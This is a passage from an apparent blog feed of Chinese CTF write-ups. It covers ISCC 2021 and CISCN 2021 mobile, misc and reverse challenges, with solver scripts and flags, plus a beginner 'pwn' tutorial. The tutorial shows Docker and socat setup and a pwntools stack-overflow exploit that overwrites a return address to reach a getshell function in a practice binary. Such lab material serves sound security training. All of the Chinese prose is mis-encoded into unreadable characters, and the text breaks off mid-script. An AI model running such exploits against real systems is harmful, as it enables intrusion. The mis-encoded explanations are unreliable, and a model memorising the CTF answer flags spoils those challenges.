"m"))</span><br></pre></td></tr></table></figure>

<p>ISCC{m0B1lE_1s_Gg9reaT!}</p>
<h2 id="OHHH"><a href="#OHHH" class="headerlink" title="OHHH"></a>OHHH</h2><p>libnc.soé‡Œæ˜¯ä¸»è¦javaå±‚é€»è¾‘ã€‚</p>
<p>check1åœ¨libLibs.soä¸­ã€‚</p>
<p>ç»è¿‡hookæµ‹è¯•ï¼Œcheck1: 6ä¸ªå°å†™å­—æ¯</p>
<p>è€Œä¸”å¿…é¡»æ»¡è¶³ä¸€äº›æ¡ä»¶ï¼š</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">string</span></span><br><span class="line"></span><br><span class="line">s = <span class="built_in">string</span>.ascii_lowercase</span><br><span class="line">d = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> s:</span><br><span class="line">                <span class="keyword">for</span> i5 <span class="keyword">in</span> s:</span><br><span class="line">                    <span class="keyword">for</span> i6 <span class="keyword">in</span> s:</span><br><span class="line">                        ss = i1+i2+i3+i4+i5+i6</span><br><span class="line">                        a = hashlib.md5()</span><br><span class="line">                        a.update(ss.encode(encoding=<span class="string">'utf-8'</span>))</span><br><span class="line">                        aa = a.hexdigest()</span><br><span class="line">                        b = <span class="number">0</span></span><br><span class="line">                        c = <span class="number">0</span></span><br><span class="line">                        d = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> aa:</span><br><span class="line">                            <span class="keyword">if</span> i == <span class="string">"0"</span>:</span><br><span class="line">                                c += <span class="number">1</span></span><br><span class="line">                                d += b</span><br><span class="line">                            b += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">if</span> d + c * <span class="number">10</span> == <span class="number">403</span>:</span><br><span class="line">                            print(d + c*<span class="number">10</span>)</span><br><span class="line">                            print(ss, aa)</span><br><span class="line"># <span class="number">403</span></span><br><span class="line"># ozulmt <span class="number">0</span>ec448d42dbf0000c020c0000048010e</span><br></pre></td></tr></table></figure>

<p>æœ€åæ ¹æ®ç”Ÿæˆçš„æ•°å­—ä½œä¸ºç´¢å¼•ï¼Œæ‰“ä¹±md5åŠ å¯†çš„å€¼ã€‚</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">sss = [<span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>]</span><br><span class="line">a = [<span class="number">6</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">6</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    print(sss[i],end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure>

<p>ISCC{6ab457d7223583baa46d8b2cb1c3c406}</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="æåçš„çº¢åŒ…"><a href="#æåçš„çº¢åŒ…" class="headerlink" title="æåçš„çº¢åŒ…"></a>æåçš„çº¢åŒ…</h2><p>16è¿›åˆ¶æ•°æ®çœ‹åˆ°äº†rarï¼Œ</p>
<p><img src="/2021/05/31/ISCC2021å¨±ä¹/image-20210517131728800.png" alt="image-20210517131728800"></p>
<p>ä¿®æ”¹åç¼€è§£å‹å¾—åˆ°txtæ–‡ä»¶ã€‚</p>
<p>æ£‹ç›˜å¯†ç ã€‚å¾—åˆ°ISCCBFSã€‚</p>
<p>ISCC{ISCCBFS}</p>
<h2 id="Retrieve-the-passcode"><a href="#Retrieve-the-passcode" class="headerlink" title="Retrieve the passcode"></a>Retrieve the passcode</h2><p>ç”»åæ ‡ç‚¹ã€‚</p>
<p><img src="/2021/05/31/ISCC2021å¨±ä¹/image-20210517134658641.png" alt="image-20210517134658641"></p>
<p>365728 è§£å¯†å‹ç¼©åŒ…ï¼Œå¾—åˆ°pdfã€‚</p>
<p>æ‘©æ–¯å¯†ç è§£å¯†ã€‚</p>
<p><img src="/2021/05/31/ISCC2021å¨±ä¹/image-20210517135009892.png" alt="image-20210517135009892"></p>
<p>ISCC{congratulationtheflagischallengeiscctwozerotwoone}</p>
<h2 id="æµ·å¸‚èœƒæ¥¼-1"><a href="#æµ·å¸‚èœƒæ¥¼-1" class="headerlink" title="æµ·å¸‚èœƒæ¥¼-1"></a>æµ·å¸‚èœƒæ¥¼-1</h2><p>è§£å‹æ–‡æ¡£ï¼Œåœ¨document.xmlä¸­å‘ç°flagã€‚</p>
<p><img src="/2021/05/31/ISCC2021å¨±ä¹/image-20210517143223338.png" alt="image-20210517143223338"></p>
<p>ISCC{zheshishui}</p>
<h2 id="ç¾äººè®¡"><a href="#ç¾äººè®¡" class="headerlink" title="ç¾äººè®¡"></a>ç¾äººè®¡</h2><p>è§£ç ã€‚</p>
<p><img src="/2021/05/31/ISCC2021å¨±ä¹/image-20210517143549342.png" alt="image-20210517143549342"></p>
<p><img src="/2021/05/31/ISCC2021å¨±ä¹/image-20210517155330298.png" alt="image-20210517155330298"></p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Garden"><a href="#Garden" class="headerlink" title="Garden"></a>Garden</h2><p>pycåœ¨çº¿åç¼–è¯‘å†™è„šæœ¬è§£å¯†ã€‚</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">f</span> = <span class="string">'2(88\x006\x1a\x10\x10\x1aIKIJ+\x1a\x10\x10\x1a\x06'</span></span><br><span class="line"><span class="variable">alphabet</span> = <span class="function"><span class="title">set</span>(<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;!@#$%+'</span>)</span></span><br><span class="line"><span class="variable">flag</span> = <span class="string">""</span></span><br><span class="line"><span class="variable">for</span> <span class="variable">i</span> <span class="variable"><span class="keyword">in</span></span> <span class="variable">f</span>:</span><br><span class="line">    <span class="variable">for</span> <span class="variable">j</span> <span class="variable"><span class="keyword">in</span></span> <span class="variable">alphabet</span>:</span><br><span class="line">        <span class="variable"><span class="keyword">if</span></span> (<span class="function"><span class="title"><span class="built_in">ord</span></span>(<span class="variable">i</span>) ^ <span class="title"><span class="built_in">ord</span></span>(<span class="variable">j</span>)) <span class="variable">!</span>= <span class="number">123</span>:</span></span><br><span class="line"><span class="function">            <span class="variable">continue</span></span></span><br><span class="line"><span class="function">        <span class="variable"><span class="keyword">else</span></span>:</span></span><br><span class="line"><span class="function">            <span class="variable">flag</span> += <span class="variable">j</span></span></span><br><span class="line"><span class="function">            <span class="variable">break</span></span></span><br><span class="line"><span class="function"><span class="title">print</span>(<span class="variable">flag</span>)</span></span><br></pre></td></tr></table></figure>

<p>ISCC{Makka2021Pakka}</p>
<h2 id="nintendo-player"><a href="#nintendo-player" class="headerlink" title="nintendo player"></a>nintendo player</h2>]]></content>
      <categories>
        <category>CTFèµ›é¢˜writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnå…¥é—¨å­¦ä¹ </title>
    <url>/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ•´ç¯‡æ–‡ç« æ˜¯æ ¹æ®Iæ˜¥ç§‹çš„æ–‡ç« è¿›è¡Œå­¦ä¹ çš„ä¸€äº›è®°å½•ã€‚</p>
<h1 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h1><p>å®‰è£…dockerã€‚</p>
<p>å¯¼å…¥é•œåƒï¼š<code>cat ubuntu.17.04.amd64.tar | docker import - ubuntu/17.04.amd64</code></p>
<p>dockerå‘½ä»¤ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¯¼å…¥é•œåƒï¼šdocker import - ubuntu/17.04.amd64</span></span><br><span class="line"><span class="comment">//è¿è¡Œé•œåƒï¼šdocker run -it -p 23946:23946 ubuntu/17.04.amd64 /bin/bash</span></span><br><span class="line">  ä¼šåˆ›å»ºä¸€ä¸ªdockerå®¹å™¨ï¼Œç¬¬ä¸€ä¸ªç«¯å£æ˜¯å®¿ä¸»æœºçš„ç«¯å£ï¼Œç¬¬äºŒä¸ªæ˜¯å®¹å™¨çš„ç«¯å£</span><br><span class="line"><span class="comment">//åˆ—å‡ºå®¹å™¨ï¼šdocker container ls -a</span></span><br><span class="line"><span class="comment">//å®¹å™¨é‡å‘½åï¼šdocker container rename old_name new_name</span></span><br><span class="line"><span class="comment">//æ‰“å¼€å®¹å™¨çš„shellï¼šdocker exec -it container_name /bin/bash</span></span><br><span class="line"><span class="comment">//å¯åŠ¨å®¹å™¨ï¼šdocker start container_name</span></span><br><span class="line"><span class="comment">//å¤åˆ¶ï¼šdocker container cp file_name container_name:/root</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯¼å…¥é•œåƒ</span></span><br><span class="line">docker load -<span class="selector-tag">i</span> nginx.tar</span><br><span class="line"><span class="comment">//å¯¼å‡ºé•œåƒ</span></span><br><span class="line">docker save -o nginx<span class="selector-class">.tar</span> nginx:latest</span><br></pre></td></tr></table></figure>

<p>å°†å¯¹åº”ç‰ˆæœ¬çš„ida serverå¤åˆ¶åˆ°å®¹å™¨ä¸­ï¼Œè¿è¡Œä½¿ç”¨IDAè¿›è¡Œè°ƒè¯•ã€‚ä¸‹è½½pwntoolsã€‚</p>
<p>åœ¨å®¹å™¨ä¸­æ˜ å°„ç¨‹åºç«¯å£ï¼š</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">socat tcp-listen:<span class="number">10001</span>,reuseaddr,fork EXEC:./heapTest_x86,pty,raw,echo=<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/30/pwnå…¥é—¨å­¦ä¹ /image-20210521213800491.png" alt="image-20210521213800491"></p>
<p>å¼€å¯pwntoolsï¼š</p>
<p><img src="/2021/05/30/pwnå…¥é—¨å­¦ä¹ /image-20210521213743741.png" alt="image-20210521213743741"></p>
<p>ä½¿ç”¨IDAé™„åŠ ç¨‹åºï¼Œ</p>
<p><img src="/2021/05/30/pwnå…¥é—¨å­¦ä¹ /image-20210521213949843.png" alt="image-20210521213949843"></p>
<p>åœ¨pythonä¸­è¾“å…¥io.recv()å¯ä»¥æ¥æ”¶ç¨‹åºçš„è¾“å‡ºã€‚</p>
<p>ä½¿ç”¨io.send()å¯ä»¥å‘é€æ•°æ®ç»™ç¨‹åºï¼Œå‘é€æ•°æ®åéœ€è¦å†å‘é€<code>\n</code>æ‰§è¡Œå›è½¦ã€‚æˆ–è€…ç›´æ¥ä½¿ç”¨sendline()ã€‚</p>
<p>ç¨‹åºæˆåŠŸæ–­ä¸‹æ¥ã€‚</p>
<p><img src="/2021/05/30/pwnå…¥é—¨å­¦ä¹ /image-20210521214305481.png" alt="image-20210521214305481"></p>
<p>ç»“æŸæ—¶ï¼Œè¦ä½¿ç”¨io.close()å…³é—­ioã€‚</p>
<p><img src="/2021/05/30/pwnå…¥é—¨å­¦ä¹ /image-20210521214401818.png" alt="image-20210521214401818"></p>
<h1 id="æ ˆæº¢å‡ºåŸºç¡€"><a href="#æ ˆæº¢å‡ºåŸºç¡€" class="headerlink" title="æ ˆæº¢å‡ºåŸºç¡€"></a>æ ˆæº¢å‡ºåŸºç¡€</h1><p>call helloç­‰ä»·äº<code>push eip; mov eip, [hello]</code></p>
<p>leaveæŒ‡ä»¤ç›¸å½“äº<code>add esp, xxh; mov esp, ebp; pop ebp</code></p>
<p>æ ˆæº¢å‡ºå°±æ˜¯è¾“å…¥è¶…é•¿åº¦çš„å­—ç¬¦ä¸²ä½¿åˆ†é…çš„æ ˆå¸§æº¢å‡ºä»¥è¾¾åˆ°æ§åˆ¶eipæ‰§è¡Œçš„ç›®çš„ã€‚</p>
<p>ä¸‹æ–­ç‚¹ï¼š</p>
<p><img src="/2021/05/30/pwnå…¥é—¨å­¦ä¹ /image-20210521215802315.png" alt="image-20210521215802315"></p>
<p>è°ƒè¯•å¹¶åˆ†æä»£ç ï¼Œå¯ä»¥è¿™æ ·å¾—å‡ºåç§»ï¼š</p>
<p><img src="/2021/05/30/pwnå…¥é—¨å­¦ä¹ /image-20210521221119660.png" alt="image-20210521221119660"></p>
<p>rå¤„æ˜¯è¿”å›åœ°å€ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦è¦†ç›–rï¼Œæ‰€ä»¥éœ€è¦è¾“å…¥22å­—èŠ‚ä»¥ä¸Šæ‰å¯ä»¥è¦†ç›–rã€‚</p>
<p>åœ¨å®¹å™¨ä¸­æ˜ å°„ç«¯å£è¿è¡Œç¨‹åºï¼š</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">socat tcp-listen:<span class="number">10001</span>,reuseaddr,fork EXEC:./hello,pty,raw,echo=<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°getshellå‡½æ•°çš„åœ°å€ï¼Œç”¨pwntoolså†™è„šæœ¬ï¼š</p>
<p><img src="/2021/05/30/pwnå…¥é—¨å­¦ä¹ /image-20210521221251779.png" alt="image-20210521221251779"></p>
<figure class="highlight moonscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span> = remote(<span class="string">'172.17.0.3'</span>,<span class="number">10001</span>)</span><br><span class="line">payload = b<span class="string">'A'</span>*<span class="number">22</span> + p32(<span class="number">0x0804846b</span>)</span><br><span class="line"><span class="built_in">io</span>.send(payload)</span><br><span class="line"><span class="built_in">io</span>.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTFèµ›é¢˜writeup</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>writeup,pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN-2021-wp</title>
    <url>/2021/05/30/CISCN-2021-wp/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="glass"><a href="#glass" class="headerlink" title="glass"></a>glass</h1><p>soæ–‡ä»¶ä¸»è¦é€»è¾‘ã€‚</p>
<p>å…ˆdumpæ•°æ®ï¼Œ</p>
<p><img src="/2021/05/30/CISCN-2021-wp/image-20210515130254705.png" alt="image-20210515130254705"></p>
<p>ç„¶åå†™è„šæœ¬æ¢å¤rc4åŠ å¯†åçš„ç»“æœï¼Œ</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">0xa3</span>,<span class="number">0x1a</span>,<span class="number">0xe3</span>,<span class="number">0x69</span>,<span class="number">0x2f</span>,<span class="number">0xbb</span>,<span class="number">0x1a</span>,<span class="number">0x84</span>,<span class="number">0x65</span>,<span class="number">0xc2</span>,<span class="number">0xad</span>,<span class="number">0xad</span>,<span class="number">0x9e</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x02</span>,<span class="number">0x1f</span>,<span class="number">0x8e</span>,<span class="number">0x36</span>,<span class="number">0x4f</span>,<span class="number">0xe1</span>,<span class="number">0xeb</span>,<span class="number">0xaf</span>,<span class="number">0xf0</span>,<span class="number">0xea</span>,<span class="number">0xc4</span>,<span class="number">0xa8</span>,<span class="number">0x2d</span>,<span class="number">0x42</span>,<span class="number">0xc7</span>,<span class="number">0x6e</span>,<span class="number">0x3f</span>,<span class="number">0xb0</span>,<span class="number">0xd3</span>,<span class="number">0xcc</span>,<span class="number">0x78</span>,<span class="number">0xf9</span>,<span class="number">0x98</span>,<span class="number">0x3f</span>]</span><br><span class="line">s = <span class="string">'12345678'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(a)):</span><br><span class="line">    a[i] ^= ord(s[i%<span class="number">8</span>])</span><br><span class="line">print(a)</span><br><span class="line">aa = a</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(aa), <span class="number">3</span>):</span><br><span class="line">    a2 = aa[i+<span class="number">1</span>]^aa[i]</span><br><span class="line">    a3 = a2^aa[i+<span class="number">2</span>]</span><br><span class="line">    a1 = aa[i]^a3</span><br><span class="line">    aa[i] = a1</span><br><span class="line">    aa[i+<span class="number">1</span>] = a2</span><br><span class="line">    aa[i+<span class="number">2</span>] = a3</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> aa:</span><br><span class="line">    result += hex(i)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">'0'</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p>æœ€årc4è§£å¯†ã€‚</p>
<p><img src="/2021/05/30/CISCN-2021-wp/image-20210515130345747.png" alt="image-20210515130345747"></p>
<p>å¾—åˆ°flagï¼šCISCN{6654d84617f627c88846c172e0f4d46c}</p>
<h1 id="BABY-bc"><a href="#BABY-bc" class="headerlink" title="BABY_bc"></a>BABY_bc</h1><p>LLVM æ¢å¤ç¨‹åºã€‚</p>
<p><img src="/2021/05/30/CISCN-2021-wp/image-20210515201706133.png" alt="image-20210515201706133"></p>
<p><img src="/2021/05/30/CISCN-2021-wp/image-20210515201439526.png" alt="image-20210515201439526"></p>
<p>fill_number,æ ¡éªŒä¸¤ä¸ªä¸º0çš„ä½æ•°ã€‚</p>
<p>docheck æ ¡éªŒè¡Œå’Œåˆ—ï¼Œï¼Œæ²¡çœ‹å…¬å‘Šï¼Œï¼Œè·‘å‡ºæ¥ä¸¤ä¸ªç»“æœï¼Œï¼Œï¼Œéº»äº†ã€‚<br><img src="/2021/05/30/CISCN-2021-wp/image-20210515205922568.png" alt="image-20210515205922568"></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">s = []</span><br><span class="line">for <span class="keyword">i1</span> in range(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">    if <span class="keyword">i1</span> == <span class="number">3</span>:</span><br><span class="line">        continue</span><br><span class="line">    for <span class="keyword">i2</span> in range(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">        if <span class="keyword">i2</span> == <span class="keyword">i1</span> <span class="keyword">or</span> <span class="keyword">i2</span> == <span class="number">0</span>:</span><br><span class="line">            continue</span><br><span class="line">        for <span class="keyword">i3</span> in range(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">            if <span class="keyword">i3</span> == <span class="keyword">i1</span> <span class="keyword">or</span> <span class="keyword">i3</span> == <span class="keyword">i2</span> <span class="keyword">or</span> <span class="keyword">i3</span> == <span class="number">4</span>:</span><br><span class="line">                continue</span><br><span class="line">            for <span class="keyword">i4</span> in range(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">                if <span class="keyword">i4</span> == <span class="keyword">i1</span> <span class="keyword">or</span> <span class="keyword">i4</span> == <span class="keyword">i2</span> <span class="keyword">or</span> <span class="keyword">i4</span> == <span class="keyword">i3</span> <span class="keyword">or</span> <span class="keyword">i4</span> == <span class="number">0</span> <span class="keyword">or</span> <span class="keyword">i4</span> == <span class="number">3</span>:</span><br><span class="line">                    continue</span><br><span class="line">                for <span class="keyword">i5</span> in range(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">                    if <span class="keyword">i5</span> == <span class="keyword">i1</span> <span class="keyword">or</span> <span class="keyword">i5</span> == <span class="keyword">i2</span> <span class="keyword">or</span> <span class="keyword">i5</span> == <span class="keyword">i3</span> <span class="keyword">or</span> <span class="keyword">i5</span> ==<span class="keyword">i4</span> <span class="keyword">or</span> <span class="keyword">i4</span> &lt;= <span class="keyword">i5</span> <span class="keyword">or</span> <span class="keyword">i5</span> == <span class="number">0</span>:</span><br><span class="line">                        continue</span><br><span class="line">                    else:</span><br><span class="line">                        a = []</span><br><span class="line">                        a.append(<span class="keyword">i1</span>)</span><br><span class="line">                        a.append(<span class="keyword">i2</span>)</span><br><span class="line">                        a.append(<span class="keyword">i3</span>)</span><br><span class="line">                        a.append(<span class="keyword">i4</span>)</span><br><span class="line">                        a.append(<span class="keyword">i5</span>)</span><br><span class="line">                        s.append(a)</span><br><span class="line">print(s)</span><br><span class="line">print(len(s))</span><br><span class="line">ss = []</span><br><span class="line">for <span class="keyword">i1</span> in range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    for <span class="keyword">i2</span> in range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        if <span class="keyword">i2</span> == <span class="keyword">i1</span> <span class="keyword">or</span> <span class="keyword">i2</span> &gt;= <span class="keyword">i1</span> <span class="keyword">or</span> <span class="keyword">i2</span> == <span class="number">5</span>:</span><br><span class="line">            continue</span><br><span class="line">        for <span class="keyword">i3</span> in range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">            if <span class="keyword">i3</span> == <span class="keyword">i1</span> <span class="keyword">or</span> <span class="keyword">i3</span> == <span class="keyword">i2</span> <span class="keyword">or</span> <span class="keyword">i3</span> == <span class="number">4</span>:</span><br><span class="line">                continue</span><br><span class="line">            for <span class="keyword">i4</span> in range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                if <span class="keyword">i4</span> == <span class="keyword">i1</span> <span class="keyword">or</span> <span class="keyword">i4</span> == <span class="keyword">i2</span> <span class="keyword">or</span> <span class="keyword">i4</span> == <span class="keyword">i3</span> <span class="keyword">or</span> <span class="keyword">i4</span> == <span class="number">3</span>:</span><br><span class="line">                    continue</span><br><span class="line">                for <span class="keyword">i5</span> in range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                    if <span class="keyword">i5</span> == <span class="keyword">i1</span> <span class="keyword">or</span> <span class="keyword">i5</span> == <span class="keyword">i2</span> <span class="keyword">or</span> <span class="keyword">i5</span> == <span class="keyword">i3</span> <span class="keyword">or</span> <span class="keyword">i5</span> ==<span class="keyword">i4</span>:</span><br><span class="line">                        continue</span><br><span class="line">                    else:</span><br><span class="line">                        a = []</span><br><span class="line">                        a.append(<span class="keyword">i1</span>)</span><br><span class="line">                        a.append(<span class="keyword">i2</span>)</span><br><span class="line">                        a.append(<span class="keyword">i3</span>)</span><br><span class="line">                        a.append(<span class="keyword">i4</span>)</span><br><span class="line">                        a.append(<span class="keyword">i5</span>)</span><br><span class="line">                        ss.append(a)</span><br><span class="line">print(ss)</span><br><span class="line">print(len(ss))</span><br><span class="line">sss = []</span><br><span class="line">for <span class="keyword">i1</span> in range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    for <span class="keyword">i2</span> in range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        if <span class="keyword">i2</span> == <span class="keyword">i1</span> <span class="keyword">or</span> <span class="keyword">i1</span> &gt;= <span class="keyword">i2</span>:</span><br><span class="line">            continue</span><br><span class="line">        for <span class="keyword">i3</span> in range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">            if <span class="keyword">i3</span> == <span class="keyword">i1</span> <span class="keyword">or</span> <span class="keyword">i3</span> == <span class="keyword">i2</span> <span class="keyword">or</span> <span class="keyword">i3</span> != <span class="number">4</span>:</span><br><span class="line">                continue</span><br><span class="line">            for <span class="keyword">i4</span> in range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                if <span class="keyword">i4</span> == <span class="keyword">i1</span> <span class="keyword">or</span> <span class="keyword">i4</span> == <span class="keyword">i2</span> <span class="keyword">or</span> <span class="keyword">i4</span> == <span class="keyword">i3</span> <span class="keyword">or</span> <span class="keyword">i4</span> &gt;= <span class="number">3</span> <span class="keyword">or</span> <span class="keyword">i4</span> == <span class="number">3</span>:</span><br><span class="line">                    continue</span><br><span class="line">                for <span class="keyword">i5</span> in range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                    if <span class="keyword">i5</span> == <span class="keyword">i1</span> <span class="keyword">or</span> <span class="keyword">i5</span> == <span class="keyword">i2</span> <span class="keyword">or</span> <span class="keyword">i5</span> == <span class="keyword">i3</span> <span class="keyword">or</span> <span class="keyword">i5</span> ==<span class="keyword">i4</span> <span class="keyword">or</span> <span class="keyword">i5</span> &gt;= <span class="keyword">i4</span>:</span><br><span class="line">                        continue</span><br><span class="line">                    else:</span><br><span class="line">                        a = []</span><br><span class="line">                        a.append(<span class="keyword">i1</span>)</span><br><span class="line">                        a.append(<span class="keyword">i2</span>)</span><br><span class="line">                        a.append(<span class="keyword">i3</span>)</span><br><span class="line">                        a.append(<span class="keyword">i4</span>)</span><br><span class="line">                        a.append(<span class="keyword">i5</span>)</span><br><span class="line">                        sss.append(a)</span><br><span class="line">print(sss)</span><br><span class="line">print(len(sss))</span><br><span class="line">ssss = []</span><br><span class="line">for <span class="keyword">i1</span> in range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    for <span class="keyword">i2</span> in range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        if <span class="keyword">i2</span> == <span class="keyword">i1</span>:</span><br><span class="line">            continue</span><br><span class="line">        for <span class="keyword">i3</span> in range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">            if <span class="keyword">i3</span> == <span class="keyword">i1</span> <span class="keyword">or</span> <span class="keyword">i3</span> == <span class="keyword">i2</span> <span class="keyword">or</span> <span class="keyword">i3</span> == <span class="number">4</span>:</span><br><span class="line">                continue</span><br><span class="line">            for <span class="keyword">i4</span> in range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                if <span class="keyword">i4</span> == <span class="keyword">i1</span> <span class="keyword">or</span> <span class="keyword">i4</span> == <span class="keyword">i2</span> <span class="keyword">or</span> <span class="keyword">i4</span> == <span class="keyword">i3</span> <span class="keyword">or</span> <span class="keyword">i4</span> != <span class="number">3</span> <span class="keyword">or</span> <span class="keyword">i4</span> == <span class="number">2</span>:</span><br><span class="line">                    continue</span><br><span class="line">                for <span class="keyword">i5</span> in range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                    if <span class="keyword">i5</span> == <span class="keyword">i1</span> <span class="keyword">or</span> <span class="keyword">i5</span> == <span class="keyword">i2</span> <span class="keyword">or</span> <span class="keyword">i5</span> == <span class="keyword">i3</span> <span class="keyword">or</span> <span class="keyword">i5</span> ==<span class="keyword">i4</span>:</span><br><span class="line">                        continue</span><br><span class="line">                    else:</span><br><span class="line">                        a = []</span><br><span class="line">                        a.append(<span class="keyword">i1</span>)</span><br><span class="line">                        a.append(<span class="keyword">i2</span>)</span><br><span class="line">                        a.append(<span class="keyword">i3</span>)</span><br><span class="line">                        a.append(<span class="keyword">i4</span>)</span><br><span class="line">                        a.append(<span class="keyword">i5</span>)</span><br><span class="line">                        ssss.append(a)</span><br><span class="line">print(ssss)</span><br><span class="line">print(len(ssss))</span><br><span class="line">sssss = []</span><br><span class="line">for <span class="keyword">i1</span> in range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    for <span class="keyword">i2</span> in range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        if <span class="keyword">i2</span> == <span class="keyword">i1</span> <span class="keyword">or</span> <span class="keyword">i2</span> &gt;= <span class="keyword">i1</span>:</span><br><span class="line">            continue</span><br><span class="line">        for <span class="keyword">i3</span> in range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">            if <span class="keyword">i3</span> == <span class="keyword">i1</span> <span class="keyword">or</span> <span class="keyword">i3</span> == <span class="keyword">i2</span> <span class="keyword">or</span> <span class="keyword">i3</span> == <span class="number">4</span>:</span><br><span class="line">                continue</span><br><span class="line">            for <span class="keyword">i4</span> in range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                if <span class="keyword">i4</span> == <span class="keyword">i1</span> <span class="keyword">or</span> <span class="keyword">i4</span> == <span class="keyword">i2</span> <span class="keyword">or</span> <span class="keyword">i4</span> == <span class="keyword">i3</span> <span class="keyword">or</span> <span class="keyword">i3</span> &lt;= <span class="keyword">i4</span> <span class="keyword">or</span> <span class="keyword">i4</span> == <span class="number">3</span>:</span><br><span class="line">                    continue</span><br><span class="line">                for <span class="keyword">i5</span> in range(<span 